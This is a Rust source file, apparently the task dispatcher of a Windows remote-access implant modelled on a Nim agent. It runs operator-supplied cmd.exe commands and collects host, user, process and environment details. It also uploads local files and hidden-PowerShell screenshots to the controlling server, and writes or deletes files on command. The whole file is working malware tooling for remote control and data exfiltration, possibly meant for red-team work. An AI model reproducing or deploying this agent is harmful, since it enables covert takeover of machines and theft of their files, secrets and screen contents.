/// Command dispatcher — implements the same task set as the Nim agent baseline.
use std::sync::atomic::{AtomicU64, Ordering};
use std::process::Command;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use crate::transport::{AgentTransport, TaskWire};

pub static DYN_SLEEP_SEC:  AtomicU64 = AtomicU64::new(u64::MAX);
pub static DYN_JITTER_PCT: AtomicU64 = AtomicU64::new(u64::MAX);

fn shell(cmd: &str) -> String {
    match Command::new("cmd.exe").args(["/s", "/c", cmd]).output() {
        Ok(o) => {
            let mut out = String::from_utf8_lossy(&o.stdout).into_owned();
            let err = String::from_utf8_lossy(&o.stderr);
            if !err.is_empty() { out.push_str(&err); }
            out
        }
        Err(e) => format!("[error: {}]", e),
    }
}

fn sysinfo() -> String {
    let hostname = std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let username = std::env::var("USERNAME").unwrap_or_else(|_| "UNKNOWN".into());
    let arch = if cfg!(target_arch = "x86_64") { "amd64" } else { "x86" };
    format!(
        "hostname={}\nusername={}\nos=windows/{}\npid={}",
        hostname, username, arch, std::process::id()
    )
}

fn ls(path: &str) -> String {
    let dir = if path.is_empty() {
        std::env::current_dir().unwrap_or_default().to_string_lossy().into_owned()
    } else {
        path.to_string()
    };
    match std::fs::read_dir(&dir) {
        Ok(entries) => entries
            .filter_map(|e| e.ok())
            .map(|e| {
                let kind = if e.path().is_dir() { "D" } else { "F" };
                format!("{}  {}", kind, e.path().display())
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Err(e) => format!("[error: {}]", e),
    }
}

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        "SHELL" => {
            t.send_result(task.id, &shell(&task.args), "");
        }
        "SLEEP" => {
            let parts: Vec<&str> = task.args.split_whitespace().collect();
            if let Some(s) = parts.first().and_then(|v| v.parse::<u64>().ok()) {
                DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
            }
            if let Some(j) = parts.get(1).and_then(|v| v.parse::<u64>().ok()) {
                DYN_JITTER_PCT.store(j, Ordering::Relaxed);
            }
            t.send_result(task.id, "[+] sleep updated", "");
        }
        "SYSINFO" => {
            t.send_result(task.id, &sysinfo(), "");
        }
        "PS" => {
            t.send_result(task.id, &shell("tasklist /FO CSV /NH 2>&1"), "");
        }
        "PWD" => {
            let cwd = std::env::current_dir()
                .map(|p| p.to_string_lossy().into_owned())
                .unwrap_or_else(|e| format!("[error: {}]", e));
            t.send_result(task.id, &cwd, "");
        }
        "CD" => match std::env::set_current_dir(&task.args) {
            Ok(_) => {
                let cwd = std::env::current_dir()
                    .map(|p| p.to_string_lossy().into_owned())
                    .unwrap_or_default();
                t.send_result(task.id, &cwd, "");
            }
            Err(e) => t.send_result(task.id, "", &format!("cd: {}", e)),
        },
        "LS" => {
            t.send_result(task.id, &ls(&task.args), "");
        }
        "KILL" => {
            t.send_result(task.id, "bye", "");
            std::process::exit(0);
        }
        "UPLOAD" => {
            // Server pushes file to agent: args = JSON {"filename":"...","remote_path":"..."}
            let j: serde_json::Value = match serde_json::from_str(&task.args) {
                Ok(v) => v,
                Err(e) => {
                    t.send_result(task.id, "", &format!("json parse: {}", e));
                    return;
                }
            };
            let filename    = j["filename"].as_str().unwrap_or("");
            let remote_path = j["remote_path"].as_str().unwrap_or("");
            let data = t.download_file(filename);
            if data.is_empty() {
                t.send_result(task.id, "", "download from server failed");
                return;
            }
            match std::fs::write(remote_path, &data) {
                Ok(_) => t.send_result(
                    task.id,
                    &format!("written {} bytes to {}", data.len(), remote_path),
                    "",
                ),
                Err(e) => t.send_result(task.id, "", &format!("write: {}", e)),
            }
        }
        "DOWNLOAD" => {
            // Agent reads local file and uploads to server
            let path = &task.args;
            let name = std::path::Path::new(path)
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| path.clone());
            match std::fs::read(path) {
                Ok(data) => {
                    let n = data.len();
                    t.upload_file(task.id, &name, &data);
                    t.send_result(task.id, &format!("uploaded {} bytes", n), "");
                }
                Err(e) => t.send_result(task.id, "", &format!("read: {}", e)),
            }
        }
        "CAT" => {
            match std::fs::read_to_string(&task.args) {
                Ok(s) => t.send_result(task.id, &s, ""),
                Err(e) => t.send_result(task.id, "", &format!("cat: {}", e)),
            }
        }
        "MKDIR" => {
            match std::fs::create_dir_all(&task.args) {
                Ok(_) => t.send_result(task.id, "[+] created", ""),
                Err(e) => t.send_result(task.id, "", &format!("mkdir: {}", e)),
            }
        }
        "RM" => {
            let r = if std::path::Path::new(&task.args).is_dir() {
                std::fs::remove_dir_all(&task.args)
            } else {
                std::fs::remove_file(&task.args)
            };
            match r {
                Ok(_) => t.send_result(task.id, "[+] removed", ""),
                Err(e) => t.send_result(task.id, "", &format!("rm: {}", e)),
            }
        }
        "ENV" => {
            let out = std::env::vars()
                .map(|(k, v)| format!("{}={}", k, v))
                .collect::<Vec<_>>()
                .join("\n");
            t.send_result(task.id, &out, "");
        }
        "SCREENSHOT" => {
            // Delegate to PowerShell: lightweight, no extra deps
            let ps = r#"Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,
    [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
$gfx = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = [System.IO.MemoryStream]::new()
$bmp.Save($ms,'Png')
[Convert]::ToBase64String($ms.ToArray())"#;
            match Command::new("powershell.exe")
                .args(["-NoP", "-NonI", "-W", "Hidden", "-C", ps])
                .output()
            {
                Ok(o) if o.status.success() => {
                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
                    if let Ok(png) = STANDARD.decode(&b64) {
                        t.upload_file(task.id, "screenshot.png", &png);
                        t.send_result(task.id, "[+] screenshot uploaded", "");
                    } else {
                        t.send_result(task.id, "", "base64 decode failed");
                    }
                }
                Ok(o) => t.send_result(task.id, "", &String::from_utf8_lossy(&o.stderr)),
                Err(e) => t.send_result(task.id, "", &format!("screenshot: {}", e)),
            }
        }
        _ => {
            t.send_result(task.id, "", &format!("unknown task type: {}", task.typ));
        }
    }
}
